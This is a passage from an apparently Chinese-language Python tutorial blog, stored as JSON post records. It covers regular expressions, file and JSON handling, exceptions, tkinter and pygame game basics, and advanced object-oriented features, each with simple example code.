匹配exp后面的位置 (?&lt;=\\bdanc)\\w+\\b 可以匹配I love dancing and reading中的第一个ing (?!exp) 匹配后面不是exp的位置 (?&lt;!exp) 匹配前面不是exp的位置 *? 重复任意次，但尽可能少重复 a.*ba.*?b 将正则表达式应用于aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串 +? 重复1次或多次，但尽可能少重复 ?? 重复0次或1次，但尽可能少重复 {M,N}? 重复M到N次，但尽可能少重复 {M,}? 重复M次以上，但尽可能少重复 说明： 如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\\进行转义处理，例如想匹配小数点可以写成\\.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成\\(和\\)，否则圆括号被视为正则表达式中的分组。 Python对正则表达式的支持Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数。 函数 说明 compile(pattern, flags=0) 编译正则表达式返回正则表达式对象 match(pattern, string, flags=0) 用正则表达式匹配字符串 成功返回匹配对象 否则返回None search(pattern, string, flags=0) 搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None split(pattern, string, maxsplit=0, flags=0) 用正则表达式指定的模式分隔符拆分字符串 返回列表 sub(pattern, repl, string, count=0, flags=0) 用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数 fullmatch(pattern, string, flags=0) match函数的完全匹配（从字符串开头到结尾）版本 findall(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回字符串的列表 finditer(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回一个迭代器 purge() 清除隐式编译的正则表达式的缓存 re.I / re.IGNORECASE 忽略大小写匹配标记 re.M / re.MULTILINE 多行匹配标记 说明： 上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。 下面我们通过一系列的例子来告诉大家在Python中如何使用正则表达式。 例子1：验证输入用户名和QQ号是否有效并给出对应的提示信息。\"\"\" 验证输入用户名和QQ号是否有效并给出对应的提示信息 要求：用户名必须由字母、数字或下划线构成且长度在6~20个字符之间，QQ号是5~12的数字且首位不能为0 \"\"\" import re def main(): username = input('请输入用户名: ') qq = input('请输入QQ号: ') # match函数的第一个参数是正则表达式字符串或正则表达式对象 # 第二个参数是要跟正则表达式做匹配的字符串对象 m1 = re.match(r'^[0-9a-zA-Z_]{6,20}$', username) if not m1: print('请输入有效的用户名.') m2 = re.match(r'^[1-9]\\d{4,11}$', qq) if not m2: print('请输入有效的QQ号.') if m1 and m2: print('你输入的信息是有效的!') if __name__ == '__main__': main() 提示： 上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\\\，例如表示数字的\\d得书写成\\\\d，这样不仅写起来不方便，阅读的时候也会很吃力。 例子2：从一段文字中提取出国内手机号码。下面这张图是截止到2017年底，国内三家运营商推出的手机号段。 import re def main(): # 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字 pattern = re.compile(r'(?&lt;=\\D)1[34578]\\d{9}(?=\\D)') sentence = ''' 重要的事情说8130123456789遍，我的手机号是13512346789这个靓号， 不是15600998765，也是110或119，王大锤的手机号才是15600998765。 ''' # 查找所有匹配并保存到一个列表中 mylist = re.findall(pattern, sentence) print(mylist) print('--------华丽的分隔线--------') # 通过迭代器取出匹配对象并获得匹配的内容 for temp in pattern.finditer(sentence): print(temp.group()) print('--------华丽的分隔线--------') # 通过search函数指定搜索位置找出所有匹配 m = pattern.search(sentence) while m: print(m.group()) m = pattern.search(sentence, m.end()) if __name__ == '__main__': main() 说明： 上面匹配国内手机号的正则表达式并不够好，因为像14开头的号码只有145或147，而上面的正则表达式并没有考虑这种情况，要匹配国内手机号，更好的正则表达式的写法是：(?&lt;=\\D)(1[38]\\d{9}|14[57]\\d{8}|15[0-35-9]\\d{8}|17[678]\\d{8})(?=\\D)，国内最近好像有19和16开头的手机号了，但是这个暂时不在我们考虑之列。 例子3：替换字符串中的不良内容import re def main(): sentence = '你丫是傻叉吗? 我操你大爷的. Fuck you.' purified = re.sub('[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔', '*', sentence, flags=re.IGNORECASE) print(purified) # 你丫是*吗? 我*你大爷的. * you. if __name__ == '__main__': main() 说明： re模块的正则表达式相关函数中都有一个flags参数，它代表了正则表达式的匹配标记，可以通过该标记来指定匹配时是否忽略大小写、是否进行多行匹配、是否显示调试信息等。如果需要为flags参数指定多个值，可以使用按位或运算符进行叠加，如flags=re.I | re.M。 例子4：拆分长字符串import re def main(): poem = '窗前明月光，疑是地上霜。举头望明月，低头思故乡。' sentence_list = re.split(r'[，。, .]', poem) while '' in sentence_list: sentence_list.remove('') print(sentence_list) # ['窗前明月光', '疑是地上霜', '举头望明月', '低头思故乡'] if __name__ == '__main__': main() 后话如果要从事爬虫类应用的开发，那么正则表达式一定是一个非常好的助手，因为它可以帮助我们迅速的从网页代码中发现某种我们指定的模式并提取出我们需要的信息，当然对于初学者来收，要编写一个正确的适当的正则表达式可能并不是一件容易的事情（当然有些常用的正则表达式可以直接在网上找找），所以实际开发爬虫应用的时候，有很多人会选择Beautiful Soup或Lxml来进行匹配和信息的提取，前者简单方便但是性能较差，后者既好用性能也好，但是安装稍嫌麻烦，这些内容我们会在后期的爬虫专题中为大家介绍。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"11文件和异常","slug":"11文件和异常","date":"2021-05-14T03:16:47.000Z","updated":"2021-06-27T01:31:12.915Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"文件和异常实际开发中常常会遇到对数据进行持久化操作的场景，而实现数据持久化最直接简单的方式就是将数据保存到文件中。说到“文件”这个词，可能需要先科普一下关于文件系统的知识，但是这里我们并不浪费笔墨介绍这个概念，请大家自行通过维基百科进行了解。 在Python中实现文件的读写操作其实非常简单，通过Python内置的open函数，我们可以指定文件名、操作模式、编码信息等来获得操作文件的对象，接下来就可以对文件进行读写操作了。这里所说的操作模式是指要打开什么样的文件（字符文件还是二进制文件）以及做什么样的操作（读、写还是追加），具体的如下表所示。 操作模式 具体含义 'r' 读取 （默认） 'w' 写入（会先截断之前的内容） 'x' 写入，如果文件已经存在会产生异常 'a' 追加，将内容写入到已有文件的末尾 'b' 二进制模式 't' 文本模式（默认） '+' 更新（既可以读又可以写） 下面这张图来自于菜鸟教程网站，它展示了如果根据应用程序的需要来设置操作模式。 读写文本文件读取文本文件时，需要在使用open函数时指定好带路径的文件名（可以使用相对路径或绝对路径）并将文件模式设置为'r'（如果不指定，默认值也是'r'），然后通过encoding参数指定编码（如果不指定，默认值是None，那么在读取文件时使用的是操作系统默认的编码），如果不能保证保存文件时使用的编码方式与encoding参数指定的编码方式是一致的，那么就可能因无法解码字符而导致读取失败。下面的例子演示了如何读取一个纯文本文件。 def main(): f = open('致橡树.txt', 'r', encoding='utf-8') print(f.read()) f.close() if __name__ == '__main__': main() 请注意上面的代码，如果open函数指定的文件并不存在或者无法打开，那么将引发异常状况导致程序崩溃。为了让代码有一定的健壮性和容错性，我们可以使用Python的异常机制对可能在运行时发生状况的代码进行适当的处理，如下所示。 def main(): f = None try: f = open('致橡树.txt', 'r', encoding='utf-8') print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') finally: if f: f.close() if __name__ == '__main__': main() 在Python中，我们可以将那些在运行时可能会出现状况的代码放在try代码块中，在try代码块的后面可以跟上一个或多个except来捕获可能出现的异常状况。例如在上面读取文件的过程中，文件找不到会引发FileNotFoundError，指定了未知的编码会引发LookupError，而如果读取文件时无法按指定方式解码会引发UnicodeDecodeError，我们在try后面跟上了三个except分别处理这三种不同的异常状况。最后我们使用finally代码块来关闭打开的文件，释放掉程序中获取的外部资源，由于finally块的代码不论程序正常还是异常都会执行到（甚至是调用了sys模块的exit函数退出Python环境，finally块都会被执行，因为exit函数实质上是引发了SystemExit异常），因此我们通常把finally块称为“总是执行代码块”，它最适合用来做释放外部资源的操作。如果不愿意在finally代码块中关闭文件对象释放资源，也可以使用上下文语法，通过with关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源，代码如下所示。 def main(): try: with open('致橡树.txt', 'r', encoding='utf-8') as f: print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') if __name__ == '__main__': main() 除了使用文件对象的read方法读取文件之外，还可以使用for-in循环逐行读取或者用readlines方法将文件按行读取到一个列表容器中，代码如下所示。 import time def main(): # 一次性读取整个文件内容 with open('致橡树.txt', 'r', encoding='utf-8') as f: print(f.read()) # 通过for-in循环逐行读取 with open('致橡树.txt', mode='r') as f: for line in f: print(line, end='') time.sleep(0.5) print() # 读取文件按行读取到列表中 with open('致橡树.txt') as f: lines = f.readlines() print(lines) if __name__ == '__main__': main() 要将文本信息写入文件文件也非常简单，在使用open函数时指定好文件名并将文件模式设置为'w'即可。注意如果需要对文件内容进行追加式写入，应该将模式设置为'a'。如果要写入的文件不存在会自动创建文件而不是引发异常。下面的例子演示了如何将1-9999之间的素数分别写入三个文件中（1-99之间的素数保存在a.txt中，100-999之间的素数保存在b.txt中，1000-9999之间的素数保存在c.txt中）。 from math import sqrt def is_prime(n): \"\"\"判断素数的函数\"\"\" assert n &gt; 0 for factor in range(2, int(sqrt(n)) + 1): if n % factor == 0: return False return True if n != 1 else False def main(): filenames = ('a.txt', 'b.txt', 'c.txt') fs_list = [] try: for filename in filenames: fs_list.append(open(filename, 'w', encoding='utf-8')) for number in range(1, 10000): if is_prime(number): if number &lt; 100: fs_list[0].write(str(number) + '\\n') elif number &lt; 1000: fs_list[1].write(str(number) + '\\n') else: fs_list[2].write(str(number) + '\\n') except IOError as ex: print(ex) print('写文件时发生错误!') finally: for fs in fs_list: fs.close() print('操作完成!') if __name__ == '__main__': main() 读写二进制文件知道了如何读写文本文件要读写二进制文件也就很简单了，下面的代码实现了复制图片文件的功能。 def main(): try: with open('guido.jpg', 'rb') as fs1: data = fs1.read() print(type(data)) # &lt;class 'bytes'&gt; with open('吉多.jpg', 'wb') as fs2: fs2.write(data) except FileNotFoundError as e: print('指定的文件无法打开.') except IOError as e: print('读写文件时出现错误.') print('程序执行结束.') if __name__ == '__main__': main() 读写JSON文件通过上面的讲解，我们已经知道如何将文本数据和二进制数据保存到文件中，那么这里还有一个问题，如果希望把一个列表或者一个字典中的数据保存到文件中又该怎么做呢？答案是将数据以JSON格式进行保存。JSON是“JavaScript Object Notation”的缩写，它本来是JavaScript语言中创建对象的一种字面量语法，现在已经被广泛的应用于跨平台跨语言的数据交换，原因很简单，因为JSON也是纯文本，任何系统任何编程语言处理纯文本都是没有问题的。目前JSON基本上已经取代了XML作为异构系统间交换数据的事实标准。关于JSON的知识，更多的可以参考JSON的官方网站，从这个网站也可以了解到每种语言处理JSON数据格式可以使用的工具或三方库，下面是一个JSON的简单例子。 { \"name\": \"骆昊\", \"age\": 38, \"qq\": 957658, \"friends\": [\"王大锤\", \"白元芳\"], \"cars\": [ {\"brand\": \"BYD\", \"max_speed\": 180}, {\"brand\": \"Audi\", \"max_speed\": 280}, {\"brand\": \"Benz\", \"max_speed\": 320} ] } 可能大家已经注意到了，上面的JSON跟Python中的字典其实是一样一样的，事实上JSON的数据类型和Python的数据类型是很容易找到对应关系的，如下面两张表所示。 JSON Python object dict array list string str number (int / real) int / float true / false True / False null None Python JSON dict object list, tuple array str string int, float, int- &amp; float-derived Enums number True / False true / false None null 我们使用Python中的json模块就可以将字典或列表以JSON格式保存到文件中，代码如下所示。 import json def main(): mydict = { 'name': '骆昊', 'age': 38, 'qq': 957658, 'friends': ['王大锤', '白元芳'], 'cars': [ {'brand': 'BYD', 'max_speed': 180}, {'brand': 'Audi', 'max_speed': 280}, {'brand': 'Benz', 'max_speed': 320} ] } try: with open('data.json', 'w', encoding='utf-8') as fs: json.dump(mydict, fs) except IOError as e: print(e) print('保存数据完成!') if __name__ == '__main__': main() json模块主要有四个比较重要的函数，分别是： dump - 将Python对象按照JSON格式序列化到文件中 dumps - 将Python对象处理成JSON格式的字符串 load - 将文件中的JSON数据反序列化成对象 loads - 将字符串的内容反序列化成Python对象 这里出现了两个概念，一个叫序列化，一个叫反序列化。自由的百科全书维基百科上对这两个概念是这样解释的：“序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换为可以存储或传输的形式，这样在需要的时候能够恢复到原先的状态，而且通过序列化的数据重新获取字节时，可以利用这些字节来产生原始对象的副本（拷贝）。与这个过程相反的动作，即从一系列字节中提取数据结构的操作，就是反序列化（deserialization）”。 目前绝大多数网络数据服务（或称之为网络API）都是基于HTTP协议提供JSON格式的数据，关于HTTP协议的相关知识，可以看看阮一峰老师的《HTTP协议入门》，如果想了解国内的网络数据服务，可以看看聚合数据和阿凡达数据等网站，国外的可以看看{API}Search网站。下面的例子演示了如何使用requests模块（封装得足够好的第三方网络访问模块）访问网络API获取国内新闻，如何通过json模块解析JSON数据并显示新闻标题，这个例子使用了天行数据提供的国内新闻数据接口，其中的APIKey需要自己到该网站申请。 import requests import json def main(): resp = requests.get('http://api.tianapi.com/guonei/?key=APIKey&amp;num=10') data_model = json.loads(resp.text) for news in data_model['newslist']: print(news['title']) if __name__ == '__main__': main() 在Python中要实现序列化和反序列化除了使用json模块之外，还可以使用pickle和shelve模块，但是这两个模块是使用特有的序列化协议来序列化数据，因此序列化后的数据只能被Python识别。关于这两个模块的相关知识可以自己看看网络上的资料。另外，如果要了解更多的关于Python异常机制的知识，可以看看segmentfault上面的文章《总结：Python中的异常处理》，这篇文章不仅介绍了Python中异常机制的使用，还总结了一系列的最佳实践，很值得一读。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"10图形用户界面和游戏开发","slug":"10图形用户界面和游戏开发","date":"2021-05-13T01:16:26.000Z","updated":"2021-06-27T01:30:49.787Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"图形用户界面和游戏开发基于tkinter模块的GUIGUI是图形用户界面的缩写，图形化的用户界面对使用过计算机的人来说应该都不陌生，在此也无需进行赘述。Python默认的GUI开发模块是tkinter（在Python 3以前的版本中名为Tkinter），从这个名字就可以看出它是基于Tk的，Tk是一个工具包，最初是为Tcl设计的，后来被移植到很多其他的脚本语言中，它提供了跨平台的GUI控件。当然Tk并不是最新和最好的选择，也没有功能特别强大的GUI控件，事实上，开发GUI应用并不是Python最擅长的工作，如果真的需要使用Python开发GUI应用，wxPython、PyQt、PyGTK等模块都是不错的选择。 基本上使用tkinter来开发GUI应用需要以下5个步骤： 导入tkinter模块中我们需要的东西。 创建一个顶层窗口对象并用它来承载整个GUI应用。 在顶层窗口对象上添加GUI组件。 通过代码将这些GUI组件的功能组织起来。 进入主事件循环(main loop)。 下面的代码演示了如何使用tkinter做一个简单的GUI应用。 import tkinter import tkinter.messagebox def main(): flag = True # 修改标签上的文字 def change_label_text(): nonlocal flag flag = not flag color, msg = ('red', 'Hello, world!')\\ if flag else ('blue', 'Goodbye, world!') label.config(text=msg, fg=color) # 确认退出 def confirm_to_quit(): if tkinter.messagebox.askokcancel('温馨提示', '确定要退出吗?'): top.quit() # 创建顶层窗口 top = tkinter.Tk() # 设置窗口大小 top.geometry('240x160') # 设置窗口标题 top.title('小游戏') # 创建标签对象并添加到顶层窗口 label = tkinter.Label(top, text='Hello, world!', font='Arial -32', fg='red') label.pack(expand=1) # 创建一个装按钮的容器 panel = tkinter.Frame(top) # 创建按钮对象 指定添加到哪个容器中 通过command参数绑定事件回调函数 button1 = tkinter.Button(panel, text='修改', command=change_label_text) button1.pack(side='left') button2 = tkinter.Button(panel, text='退出', command=confirm_to_quit) button2.pack(side='right') panel.pack(side='bottom') # 开启主事件循环 tkinter.mainloop() if __name__ == '__main__': main() 需要说明的是，GUI应用通常是事件驱动式的，之所以要进入主事件循环就是要监听鼠标、键盘等各种事件的发生并执行对应的代码对事件进行处理，因为事件会持续的发生，所以需要这样的一个循环一直运行着等待下一个事件的发生。另一方面，Tk为控件的摆放提供了三种布局管理器，通过布局管理器可以对控件进行定位，这三种布局管理器分别是：Placer（开发者提供控件的大小和摆放位置）、Packer（自动将控件填充到合适的位置）和Grid（基于网格坐标来摆放控件），此处不进行赘述。 使用Pygame进行游戏开发Pygame是一个开源的Python模块，专门用于多媒体应用（如电子游戏）的开发，其中包含对图像、声音、视频、事件、碰撞等的支持。Pygame建立在SDL的基础上，SDL是一套跨平台的多媒体开发库，用C语言实现，被广泛的应用于游戏、模拟器、播放器等的开发。而Pygame让游戏开发者不再被底层语言束缚，可以更多的关注游戏的功能和逻辑。 下面我们来完成一个简单的小游戏，游戏的名字叫“大球吃小球”，当然完成这个游戏并不是重点，学会使用Pygame也不是重点，最重要的我们要在这个过程中体会如何使用前面讲解的面向对象程序设计，学会用这种编程思想去解决现实中的问题。 制作游戏窗口import pygame def main(): # 初始化导入的pygame中的模块 pygame.init() # 初始化用于显示的窗口并设置窗口尺寸 screen = pygame.display.set_mode((800, 600)) # 设置当前窗口的标题 pygame.display.set_caption('大球吃小球') running = True # 开启一个事件循环处理发生的事件 while running: # 从消息队列中获取事件并对事件进行处理 for event in pygame.event.get(): if event.type == pygame.QUIT: running = False if __name__ == '__main__': main() 在窗口中绘图可以通过pygame中draw模块的函数在窗口上绘图，可以绘制的图形包括：线条、矩形、多边形、圆、椭圆、圆弧等。需要说明的是，屏幕坐标系是将屏幕左上角设置为坐标原点(0, 0)，向右是x轴的正向，向下是y轴的正向，在表示位置或者设置尺寸的时候，我们默认的单位都是像素。所谓像素就是屏幕上的一个点，你可以用浏览图片的软件试着将一张图片放大若干倍，就可以看到这些点。pygame中表示颜色用的是色光三原色表示法，即通过一个元组或列表来指定颜色的RGB值，每个值都在0~255之间，因为是每种原色都用一个8位（bit）的值来表示，三种颜色相当于一共由24位构成，这也就是常说的“24位颜色表示法”。 import pygame def main(): # 初始化导入的pygame中的模块 pygame.init() # 初始化用于显示的窗口并设置窗口尺寸 screen = pygame.display.set_mode((800, 600)) # 设置当前窗口的标题 pygame.display.set_caption('大球吃小球') # 设置窗口的背景色(颜色是由红绿蓝三原色构成的元组) screen.fill((242, 242, 242)) # 绘制一个圆(参数分别是: 屏幕, 颜色, 圆心位置, 半径, 0表示填充圆) pygame.draw.circle(screen, (255, 0, 0,), (100, 100), 30, 0) # 刷新当前窗口(渲染窗口将绘制的图像呈现出来) pygame.display.flip() running = True # 开启一个事件循环处理发生的事件 while running: # 从消息队列中获取事件并对事件进行处理 for event in pygame.event.get(): if event.type == pygame.QUIT: running = False if __name__ == '__main__': main() 加载图像如果需要直接加载图像到窗口上，可以使用pygame中image模块的函数来加载图像，再通过之前获得的窗口对象的blit方法渲染图像，代码如下所示。 import pygame def main(): # 初始化导入的pygame中的模块 pygame.init() # 初始化用于显示的窗口并设置窗口尺寸 screen = pygame.display.set_mode((800, 600)) # 设置当前窗口的标题 pygame.display.set_caption('大球吃小球') # 设置窗口的背景色(颜色是由红绿蓝三原色构成的元组) screen.fill((255, 255, 255)) # 通过指定的文件名加载图像 ball_image = pygame.image.load('./res/ball.png') # 在窗口上渲染图像 screen.blit(ball_image, (50, 50)) # 刷新当前窗口(渲染窗口将绘制的图像呈现出来) pygame.display.flip() running = True # 开启一个事件循环处理发生的事件 while running: # 从消息队列中获取事件并对事件进行处理 for event in pygame.event.get(): if event.type == pygame.QUIT: running = False if __name__ == '__main__': main() 实现动画效果说到动画这个词大家都不会陌生，事实上要实现动画效果，本身的原理也非常简单，就是将不连续的图片连续的播放，只要每秒钟达到了一定的帧数，那么就可以做出比较流畅的动画效果。如果要让上面代码中的小球动起来，可以将小球的位置用变量来表示，并在循环中修改小球的位置再刷新整个窗口即可。 import pygame def main(): # 初始化导入的pygame中的模块 pygame.init() # 初始化用于显示的窗口并设置窗口尺寸 screen = pygame.display.set_mode((800, 600)) # 设置当前窗口的标题 pygame.display.set_caption('大球吃小球') # 定义变量来表示小球在屏幕上的位置 x, y = 50, 50 running = True # 开启一个事件循环处理发生的事件 while running: # 从消息队列中获取事件并对事件进行处理 for event in pygame.event.get(): if event.type == pygame.QUIT: running = False screen.fill((255, 255, 255)) pygame.draw.circle(screen, (255, 0, 0,), (x, y), 30, 0) pygame.display.flip() # 每隔50毫秒就改变小球的位置再刷新窗口 pygame.time.delay(50) x, y = x + 5, y + 5 if __name__ == '__main__': main() 碰撞检测通常一个游戏中会有很多对象出现，而这些对象之间的“碰撞”在所难免，比如炮弹击中了飞机、箱子撞到了地面等。碰撞检测在绝大多数的游戏中都是一个必须得处理的至关重要的问题，pygame的sprite（动画精灵）模块就提供了对碰撞检测的支持，这里我们暂时不介绍sprite模块提供的功能，因为要检测两个小球有没有碰撞其实非常简单，只需要检查球心的距离有没有小于两个球的半径之和。为了制造出更多的小球，我们可以通过对鼠标事件的处理，在点击鼠标的位置创建颜色、大小和移动速度都随机的小球，当然要做到这一点，我们可以把之前学习到的面向对象的知识应用起来。 from enum import Enum, unique from math import sqrt from random import randint import pygame @unique class Color(Enum): \"\"\"颜色\"\"\" RED = (255, 0, 0) GREEN = (0, 255, 0) BLUE = (0, 0, 255) BLACK = (0, 0, 0) WHITE = (255, 255, 255) GRAY = (242, 242, 242) @staticmethod def random_color(): \"\"\"获得随机颜色\"\"\" r = randint(0, 255) g = randint(0, 255) b = randint(0, 255) return (r, g, b) class Ball(object): \"\"\"球\"\"\" def __init__(self, x, y, radius, sx, sy, color=Color.RED): \"\"\"初始化方法\"\"\" self.x = x self.y = y self.radius = radius self.sx = sx self.sy = sy self.color = color self.alive = True def move(self, screen): \"\"\"移动\"\"\" self.x += self.sx self.y += self.sy if self.x - self.radius &lt;= 0 or \\ self.x + self.radius &gt;= screen.get_width(): self.sx = -self.sx if self.y - self.radius &lt;= 0 or \\ self.y + self.radius &gt;= screen.get_height(): self.sy = -self.sy def eat(self, other): \"\"\"吃其他球\"\"\" if self.alive and other.alive and self != other: dx, dy = self.x - other.x, self.y - other.y distance = sqrt(dx ** 2 + dy ** 2) if distance &lt; self.radius + other.radius \\ and self.radius &gt; other.radius: other.alive = False self.radius = self.radius + int(other.radius * 0.146) def draw(self, screen): \"\"\"在窗口上绘制球\"\"\" pygame.draw.circle(screen, self.color, (self.x, self.y), self.radius, 0) 事件处理可以在事件循环中对鼠标事件进行处理，通过事件对象的type属性可以判定事件类型，再通过pos属性就可以获得鼠标点击的位置。如果要处理键盘事件也是在这个地方，做法与处理鼠标事件类似。 def main(): # 定义用来装所有球的容器 balls = [] # 初始化导入的pygame中的模块 pygame.init() # 初始化用于显示的窗口并设置窗口尺寸 screen = pygame.display.set_mode((800, 600)) # 设置当前窗口的标题 pygame.display.set_caption('大球吃小球') running = True # 开启一个事件循环处理发生的事件 while running: # 从消息队列中获取事件并对事件进行处理 for event in pygame.event.get(): if event.type == pygame.QUIT: running = False # 处理鼠标事件的代码 if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1: # 获得点击鼠标的位置 x, y = event.pos radius = randint(10, 100) sx, sy = randint(-10, 10), randint(-10, 10) color = Color.random_color() # 在点击鼠标的位置创建一个球(大小、速度和颜色随机) ball = Ball(x, y, radius, sx, sy, color) # 将球添加到列表容器中 balls.append(ball) screen.fill((255, 255, 255)) # 取出容器中的球 如果没被吃掉就绘制 被吃掉了就移除 for ball in balls: if ball.alive: ball.draw(screen) else: balls.remove(ball) pygame.display.flip() # 每隔50毫秒就改变球的位置再刷新窗口 pygame.time.delay(50) for ball in balls: ball.move(screen) # 检查球有没有吃到其他的球 for other in balls: ball.eat(other) if __name__ == '__main__': main() 上面的两段代码合在一起，我们就完成了“大球吃小球”的游戏（如下图所示），准确的说它算不上一个游戏，但是做一个小游戏的基本知识我们已经通过这个例子告诉大家了，有了这些知识已经可以开始你的小游戏开发之旅了。其实上面的代码中还有很多值得改进的地方，比如刷新窗口以及让球移动起来的代码并不应该放在事件循环中，等学习了多线程的知识后，用一个后台线程来处理这些事可能是更好的选择。如果希望获得更好的用户体验，我们还可以在游戏中加入背景音乐以及在球与球发生碰撞时播放音效，利用pygame的mixer和music模块，我们可以很容易的做到这一点，大家可以自行了解这方面的知识。事实上，想了解更多的关于pygame的知识，最好的教程是pygame的官方网站，如果英语没毛病就可以赶紧去看看啦。 如果想开发3D游戏，pygame就显得力不从心了，对3D游戏开发如果有兴趣的读者不妨看看Panda3D。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"09面向对象进阶","slug":"09面向对象进阶","date":"2021-05-12T00:10:49.000Z","updated":"2021-09-20T08:47:43.885Z","comments":true,"path":"posts/4a9a6cba.html","link":"","permalink":"http://www.xiaocaibi.top/posts/4a9a6cba.html","excerpt":"","text":"面向对象进阶在前面的章节我们已经了解了面向对象的入门知识，知道了如何定义类，如何创建对象以及如何给对象发消息。为了能够更好的使用面向对象编程思想进行程序开发，我们还需要对Python中的面向对象编程进行更为深入的了解。 @property装饰器之前我们讨论过Python中属性和方法访问权限的问题，虽然我们不建议将属性设置为私有的，但是如果直接将属性暴露给外界也是有问题的，比如我们没有办法检查赋给属性的值是否有效。我们之前的建议是将属性命名以单下划线开头，通过这种方式来暗示属性是受保护的，不建议外界直接访问，那么如果想访问属性可以通过属性的getter（访问器）和setter（修改器）方法进行对应的操作。如果要做到这点，就可以考虑使用@property包装器来包装getter和setter方法，使得对属性的访问既安全又方便，代码如下所示。 class Person(object): def __init__(self, name, age): self._name = name self._age = age # 访问器 - getter方法 @property def name(self): return self._name # 访问器 - getter方法 @property def age(self): return self._age # 修改器 - setter方法 @age.setter def age(self, age): self._age = age def play(self): if self._age &lt;= 16: print('%s正在玩飞行棋.' % self._name) else: print('%s正在玩斗地主.' % self._name) def main(): person = Person('王大锤', 12) person.play() person.age = 22 person.play() # person.name = '白元芳' # AttributeError: can't set attribute if __name__ == '__main__': main() __slots__魔法我们讲到这里，不知道大家是否已经意识到，Python是一门动态语言。通常，动态语言允许我们在程序运行时给对象绑定新的属性或方法，当然也可以对已经绑定的属性和方法进行解绑定。但是如果我们需要限定自定义类型的对象只能绑定某些属性，可以通过在类中定义__slots__变量来进行限定。需要注意的是__slots__的限定只对当前类的对象生效，对子类并不起任何作用。 class Person(object): # 限定Person对象只能绑定_name, _age和_gender属性 __slots__ = ('_name', '_age', '_gender') def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self._name @property def age(self): return self._age @age.setter def age(self, age): self._age = age def play(self): if self._age &lt;= 16: print('%s正在玩飞行棋.' % self._name) else: print('%s正在玩斗地主.' % self._name) def main(): person = Person('王大锤', 22) person.play() person._gender = '男' # AttributeError: 'Person' object has no attribute '_is_gay' # person._is_gay = True 静态方法和类方法之前，我们在类中定义的方法都是对象方法，也就是说这些方法都是发送给对象的消息。实际上，我们写在类中的方法并不需要都是对象方法，例如我们定义一个“三角形”类，通过传入三条边长来构造三角形，并提供计算周长和面积的方法，但是传入的三条边长未必能构造出三角形对象，因此我们可以先写一个方法来验证三条边长是否可以构成三角形，这个方法很显然就不是对象方法，因为在调用这个方法时三角形对象尚未创建出来（因为都不知道三条边能不能构成三角形），所以这个方法是属于三角形类而并不属于三角形对象的。我们可以使用静态方法来解决这类问题，代码如下所示。 from math import sqrt class Triangle(object): def __init__(self, a, b, c): self._a = a self._b = b self._c = c @staticmethod def is_valid(a, b, c): return a + b &gt; c and b + c &gt; a and a + c &gt; b def perimeter(self): return self._a + self._b + self._c def area(self): half = self.perimeter() / 2 return sqrt(half * (half - self._a) * (half - self._b) * (half - self._c)) def main(): a, b, c = 3, 4, 5 # 静态方法和类方法都是通过给类发消息来调用的 if Triangle.is_valid(a, b, c): t = Triangle(a, b, c) print(t.perimeter()) # 也可以通过给类发消息来调用对象方法但是要传入接收消息的对象作为参数 # print(Triangle.perimeter(t)) print(t.area()) # print(Triangle.area(t)) else: print('无法构成三角形.') if __name__ == '__main__': main() 和静态方法比较类似，Python还可以在类中定义类方法，类方法的第一个参数约定名为cls，它代表的是当前类相关的信息的对象（类本身也是一个对象，有的地方也称之为类的元数据对象），通过这个参数我们可以获取和类相关的信息并且可以创建出类的对象，代码如下所示。 from time import time, localtime, sleep class Clock(object): \"\"\"数字时钟\"\"\" def __init__(self, hour=0, minute=0, second=0): self._hour = hour self._minute = minute self._second = second @classmethod def now(cls): ctime = localtime(time()) return cls(ctime.tm_hour, ctime.tm_min, ctime.tm_sec) def run(self): \"\"\"走字\"\"\" self._second += 1 if self._second == 60: self._second = 0 self._minute += 1 if self._minute == 60: self._minute = 0 self._hour += 1 if self._hour == 24: self._hour = 0 def show(self): \"\"\"显示时间\"\"\" return '%02d:%02d:%02d' % \\ (self._hour, self._minute, self._second) def main(): # 通过类方法创建对象并获取系统时间 clock = Clock.now() while True: print(clock.show()) sleep(1) clock.run() if __name__ == '__main__': main() 类之间的关系简单的说，类和类之间的关系有三种：is-a、has-a和use-a关系。 is-a关系也叫继承或泛化，比如学生和人的关系、手机和电子产品的关系都属于继承关系。 